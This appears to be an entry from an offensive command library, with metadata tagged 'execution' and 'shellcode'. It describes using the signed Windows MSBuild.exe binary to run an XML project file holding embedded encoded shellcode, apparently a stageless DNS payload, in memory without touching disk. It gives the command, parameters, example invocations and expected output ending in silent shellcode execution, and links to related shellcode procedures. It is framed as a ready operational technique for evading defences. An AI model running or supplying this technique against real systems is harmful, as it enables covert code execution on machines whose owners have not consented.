---
type: command
executor: cmd
data: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe $_XML_PATH'
output: null
created_at: '2023-04-06T03:56:16.386949+00:00'
updated_at: '2023-04-10T20:36:24.586607+00:00'
platforms:
  - Windows
tags:
  - execution
  - shellcode
verified: true
validated: true
---

# MSBuild Execute x64 DNS Payload

## Command

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe $_XML_PATH
```

## Description

Executes an MSBuild XML project file containing embedded encoded shellcode on a 64-bit Windows system, triggering in-memory execution without disk writes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_XML_PATH | Full path to the XML file (e.g., C:\Windows\Temp\dns_raw_stageless_x64.xml) | Yes |

## Examples

### Basic Usage

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
```

### Advanced Usage

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe /p:Configuration=Release C:\path\to\project.xml
```

## Expected Output

Microsoft (R) Build Engine version ...  
Build started ...  
...  
Build succeeded.

0 Warning(s)
0 Error(s)

Shellcode executes silently post-build.

## Related

- [[procedures/msbuild-shellcode-execution]]
- [[commands/generate-encoded-shellcode]]
